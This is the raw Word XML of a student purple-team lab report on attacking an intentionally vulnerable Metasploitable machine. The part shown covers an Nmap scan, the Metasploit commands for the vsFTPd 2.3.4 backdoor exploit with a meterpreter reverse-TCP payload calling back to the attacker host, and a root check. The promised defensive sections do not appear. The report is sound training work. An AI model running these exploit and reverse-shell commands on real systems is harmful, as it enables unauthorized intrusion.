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4F2C0" w14:textId="72D8F68E" w:rsidR="008E45D1" w:rsidRDefault="00B31ADC">
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251691008" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="08779ED3" wp14:editId="44A674EA">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>65314</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>-653143</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="5257800" cy="462643"/>
                <wp:effectExtent l="0" t="0" r="0" b="33020"/>
                <wp:wrapNone/>
                <wp:docPr id="1899104141" name="Rectangle 20"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="5257800" cy="462643"/>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24A3A3" w14:textId="4C434831" w:rsidR="00B31ADC" w:rsidRPr="00017AC2" w:rsidRDefault="00B31ADC" w:rsidP="00B31ADC">
                            <w:pPr>
                              <w:jc w:val="center"/>
                              <w:rPr>
                                <w:sz w:val="28"/>
                                <w:szCs w:val="28"/>
                              </w:rPr>
                            </w:pPr>
                            <w:proofErr w:type="gramStart"/>
                            <w:r w:rsidRPr="00017AC2">
                              <w:rPr>
                                <w:sz w:val="28"/>
                                <w:szCs w:val="28"/>
                              </w:rPr>
                              <w:t>Name :</w:t>
                            </w:r>
                            <w:proofErr w:type="gramEnd"/>
                            <w:r w:rsidRPr="00017AC2">
                              <w:rPr>
                                <w:sz w:val="28"/>
                                <w:szCs w:val="28"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> Parth </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00017AC2">
                              <w:rPr>
                                <w:sz w:val="28"/>
                                <w:szCs w:val="28"/>
                              </w:rPr>
                              <w:t>Ravriya</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00017AC2">
                              <w:rPr>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79ED3" id="Rectangle 20" o:spid="_x0000_s1026" style="position:absolute;margin-left:5.15pt;margin-top:-51.45pt;width:414pt;height:36.4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" filled="f" stroked="f">
                <v:shadow on="t" color="black" opacity="22937f" origin=",.5" offset="0,.63889mm"/>
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="1C24A3A3" w14:textId="4C434831" w:rsidR="00B31ADC" w:rsidRPr="00017AC2" w:rsidRDefault="00B31ADC" w:rsidP="00B31ADC">
                      <w:pPr>
                        <w:jc w:val="center"/>
                        <w:rPr>
                          <w:sz w:val="28"/>
                          <w:szCs w:val="28"/>
                        </w:rPr>
                      </w:pPr>
                      <w:proofErr w:type="gramStart"/>
                      <w:r w:rsidRPr="00017AC2">
                        <w:rPr>
                          <w:sz w:val="28"/>
                          <w:szCs w:val="28"/>
                        </w:rPr>
                        <w:t>Name :</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/>
                      <w:r w:rsidRPr="00017AC2">
                        <w:rPr>
                          <w:sz w:val="28"/>
                          <w:szCs w:val="28"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> Parth </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00017AC2">
                        <w:rPr>
                          <w:sz w:val="28"/>
                          <w:szCs w:val="28"/>
                        </w:rPr>
                        <w:t>Ravriya</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00017AC2">
                        <w:rPr>
                          <w:sz w:val="28"/>
                          <w:szCs w:val="28"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> </w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:t>Purple Team Report: "Breach &amp; Defend - Clash of Teams 101"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53618205" w14:textId="77777777" w:rsidR="008E45D1" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>1. Executive Summary</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EC5E496" w14:textId="77777777" w:rsidR="008E45D1" w:rsidRDefault="00000000">
      <w:r>
        <w:t>This report documents the full process of a simulated cyberattack on a vulnerable Metasploitable machine. The Red Team (offensive) initiated a multi-stage attack, exploiting a known vulnerability in vsFTPd 2.3.4 (FTP server) to gain unauthorized access to the target system. Once access was achieved, privilege escalation was performed to gain root access. The Blue Team (defensive) analyzed the attack, detected it using Wireshark and system logs, and applied remediation steps to mitigate future vulnerabilities.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>This report outlines the entire attack chain, from exploitation to detection and remediation, highlighting the Red Team's actions, the Blue Team's response, and the corrective actions taken to secure the system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68DF4879" w14:textId="77777777" w:rsidR="008E45D1" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. Attack Log: Red Team Actions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58EC3F12" w14:textId="77777777" w:rsidR="008E45D1" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.1 Reconnaissance Phase</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BE5F09B" w14:textId="77777777" w:rsidR="00C8073B" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Nmap Scan:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- An Nmap scan was performed on the Metasploitable machine to identify open ports. The following open ports were discovered:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  - Port 21 (FTP)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  - Port 22 (SSH)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  - Port 80 (HTTP)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">The target's IP address </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">was </w:t>
      </w:r>
      <w:r w:rsidR="00C8073B">
        <w:t xml:space="preserve"> 10</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00C8073B">
        <w:t>66.</w:t>
      </w:r>
      <w:r>
        <w:t>x.x</w:t>
      </w:r>
      <w:r w:rsidR="00C8073B">
        <w:t>.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="7A3C6BB4" w14:textId="52AE256C" w:rsidR="008E45D1" w:rsidRDefault="00C8073B">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251659264" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="7DDE7679" wp14:editId="206DD973">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>1030514</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>110490</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="214086" cy="45719"/>
                <wp:effectExtent l="57150" t="19050" r="71755" b="88265"/>
                <wp:wrapNone/>
                <wp:docPr id="800654709" name="Rectangle 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="214086" cy="45719"/>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1CD3B" id="Rectangle 3" o:spid="_x0000_s1026" style="position:absolute;margin-left:81.15pt;margin-top:8.7pt;width:16.8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" fillcolor="#e00" strokecolor="#4579b8 [3044]">
                <v:shadow on="t" color="black" opacity="22937f" origin=",.5" offset="0,.63889mm"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5502960E" wp14:editId="04EEB93F">
            <wp:extent cx="5486400" cy="1925320"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="74626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1525" name="Picture 746261525"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId6"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="1925320"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AFCD43E" w14:textId="77777777" w:rsidR="008E45D1" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.2 Exploitation Phase</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D720F4B" w14:textId="0050A81B" w:rsidR="00C8073B" w:rsidRDefault="00000000" w:rsidP="00C8073B">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>vsFTPd 2.3.4 Backdoor Exploit:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">- The vsFTPd 2.3.4 service on port 21 was identified as vulnerable to the backdoor exploit </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>that allows attackers to remotely execute commands.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">Using Metasploit, the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>vsFTPd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 2.3.4 backdoor exploit was launched:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00C8073B">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251634688" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="44F57538" wp14:editId="2D13D5C2">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>700088</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>4743450</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="319087" cy="85725"/>
                <wp:effectExtent l="57150" t="19050" r="81280" b="104775"/>
                <wp:wrapNone/>
                <wp:docPr id="976810302" name="Rectangle 9"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="319087" cy="85725"/>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6C942" id="Rectangle 9" o:spid="_x0000_s1026" style="position:absolute;margin-left:55.15pt;margin-top:373.5pt;width:25.1pt;height:6.7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" fillcolor="#e00" strokecolor="#4579b8 [3044]">
                <v:shadow on="t" color="black" opacity="22937f" origin=",.5" offset="0,.63889mm"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00C8073B">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251633664" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="3330B706" wp14:editId="406DD743">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>2714625</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>4833938</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="266383" cy="47625"/>
                <wp:effectExtent l="57150" t="19050" r="76835" b="104775"/>
                <wp:wrapNone/>
                <wp:docPr id="781616529" name="Rectangle 8"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="266383" cy="4762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215AC" id="Rectangle 8" o:spid="_x0000_s1026" style="position:absolute;margin-left:213.75pt;margin-top:380.65pt;width:21pt;height:3.7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" fillcolor="#c00000" strokecolor="#4579b8 [3044]">
                <v:shadow on="t" color="black" opacity="22937f" origin=",.5" offset="0,.63889mm"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00C8073B">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251632640" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="4FDDC2E4" wp14:editId="29829087">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>2719388</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>4676775</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="261937" cy="57150"/>
                <wp:effectExtent l="57150" t="19050" r="81280" b="95250"/>
                <wp:wrapNone/>
                <wp:docPr id="889483208" name="Rectangle 7"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="261937" cy="5715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A7CEB" id="Rectangle 7" o:spid="_x0000_s1026" style="position:absolute;margin-left:214.15pt;margin-top:368.25pt;width:20.6pt;height:4.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" fillcolor="#c00000" strokecolor="#4579b8 [3044]">
                <v:shadow on="t" color="black" opacity="22937f" origin=",.5" offset="0,.63889mm"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00C8073B">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4306663B" wp14:editId="6043B0D4">
            <wp:extent cx="5486400" cy="4603750"/>
            <wp:effectExtent l="0" t="0" r="0" b="6350"/>
            <wp:docPr id="1206364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682" name="Picture 1206364682"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId7"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="4603750"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>use exploit/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>unix</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/ftp/vsftpd_234_backdoor</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>set RHOST 1</w:t>
      </w:r>
      <w:r w:rsidR="00C8073B">
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00C8073B">
        <w:t>66</w:t>
      </w:r>
      <w:r>
        <w:t>.x.x</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>set LHOST 1</w:t>
      </w:r>
      <w:r w:rsidR="00C8073B">
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00C8073B">
        <w:t>66</w:t>
      </w:r>
      <w:r>
        <w:t>.y.y  # Kali's IP address</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00C8073B">
        <w:t xml:space="preserve">set PAYLOAD </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00C8073B">
        <w:t>linux</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00C8073B">
        <w:t>/x86/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00C8073B">
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00C8073B">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00C8073B">
        <w:t>reverse_tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00C8073B">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50675877" w14:textId="6E88FE33" w:rsidR="008E45D1" w:rsidRDefault="00FF7555" w:rsidP="00C8073B">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251641856" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="0915BC7A" wp14:editId="54E0414A">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>513715</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1445895</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="300038" cy="76200"/>
                <wp:effectExtent l="57150" t="19050" r="81280" b="95250"/>
                <wp:wrapNone/>
                <wp:docPr id="946618395" name="Rectangle 12"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="300038" cy="7620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C6B91" id="Rectangle 12" o:spid="_x0000_s1026" style="position:absolute;margin-left:40.45pt;margin-top:113.85pt;width:23.65pt;height:6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43904" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="69572A07" wp14:editId="0DC0178F">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>490538</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1350645</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="280987" cy="114300"/>
                <wp:effectExtent l="57150" t="19050" r="81280" b="95250"/>
                <wp:wrapNone/>
                <wp:docPr id="1826191898" name="Rectangle 12"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="280987" cy="11430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A443D" id="Rectangle 12" o:spid="_x0000_s1026" style="position:absolute;margin-left:38.65pt;margin-top:106.35pt;width:22.1pt;height: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36736" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="2A442CD5" wp14:editId="1E799334">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>2986088</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1645920</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="290512" cy="57150"/>
                <wp:effectExtent l="57150" t="19050" r="71755" b="95250"/>
                <wp:wrapNone/>
                <wp:docPr id="284333259"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500DC" id="Rectangle 13" o:spid="_x0000_s1026" style="position:absolute;margin-left:235.15pt;margin-top:129.6pt;width:22.85pt;height:4.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35712" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="757E45E6" wp14:editId="101A46D0">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>1971675</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1626870</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="300038" cy="76200"/>
                <wp:effectExtent l="57150" t="19050" r="81280" b="95250"/>
                <wp:wrapNone/>
                <wp:docPr id="2080233005" name="Rectangle 12"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="300038" cy="7620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A8634" id="Rectangle 12" o:spid="_x0000_s1026" style="position:absolute;margin-left:155.25pt;margin-top:128.1pt;width:23.65pt;height:6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" fillcolor="#e00" strokecolor="#4579b8 [3044]">
                <v:shadow on="t" color="black" opacity="22937f" origin=",.5" offset="0,.63889mm"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:t>exploit</w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00C8073B">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1CADA2B3" wp14:editId="4F5A3F60">
            <wp:extent cx="5486400" cy="2052955"/>
            <wp:effectExtent l="0" t="0" r="0" b="4445"/>
            <wp:docPr id="1573582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2602" name="Picture 1573582602"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId8"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="2052955"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:br/>
        <w:t>- The reverse shell was established, giving the attacker access to the Metasploitable system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27B9B682" w14:textId="77777777" w:rsidR="008E45D1" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>2.3 Privilege Escalation Phase</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A9B5493" w14:textId="53378380" w:rsidR="008E45D1" w:rsidRDefault="00FF7555">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251680768" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="13BC9B25" wp14:editId="5CB02CAA">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>481012</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1830070</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="290512" cy="57150"/>
                <wp:effectExtent l="57150" t="19050" r="71755" b="95250"/>
                <wp:wrapNone/>
                <wp:docPr id="428160636"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5E30AB" id="Rectangle 13" o:spid="_x0000_s1026" style="position:absolute;margin-left:37.85pt;margin-top:144.1pt;width:22.85pt;height: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57216" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="7240A394" wp14:editId="79E3D9F8">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>504825</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1734820</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="290512" cy="57150"/>
                <wp:effectExtent l="57150" t="19050" r="71755" b="95250"/>
                <wp:wrapNone/>
                <wp:docPr id="1885331433"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9508D" id="Rectangle 13" o:spid="_x0000_s1026" style="position:absolute;margin-left:39.75pt;margin-top:136.6pt;width:22.85pt;height:4.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54144" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="03DB13B8" wp14:editId="2C5FCE61">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>3000375</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>2006282</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="290512" cy="57150"/>
                <wp:effectExtent l="57150" t="19050" r="71755" b="95250"/>
                <wp:wrapNone/>
                <wp:docPr id="1242431031"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E8227" id="Rectangle 13" o:spid="_x0000_s1026" style="position:absolute;margin-left:236.25pt;margin-top:157.95pt;width:22.85pt;height:4.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50048" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="6D1B3829" wp14:editId="1828A149">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>1962150</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>2015808</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="290512" cy="57150"/>
                <wp:effectExtent l="57150" t="19050" r="71755" b="95250"/>
                <wp:wrapNone/>
                <wp:docPr id="1541712965"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EE00F" id="Rectangle 13" o:spid="_x0000_s1026" style="position:absolute;margin-left:154.5pt;margin-top:158.75pt;width:22.85pt;height:4.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" fillcolor="#e00" strokecolor="#4579b8 [3044]">
                <v:shadow on="t" color="black" opacity="22937f" origin=",.5" offset="0,.63889mm"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:t>Once a Meterpreter shell was obtained, the Red Team escalated privileges from a low-level user to root access:</w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00000000">
        <w:t>whoami</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00000000">
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4F06F529" wp14:editId="25CB7FCA">
            <wp:extent cx="5486400" cy="2052955"/>
            <wp:effectExtent l="0" t="0" r="0" b="4445"/>
            <wp:docPr id="1234114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2602" name="Picture 1573582602"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId8"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="2052955"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:br/>
        <w:t>The result showed root, confirming successful privilege escalation.</w:t>
      </w:r>
    </w:p>
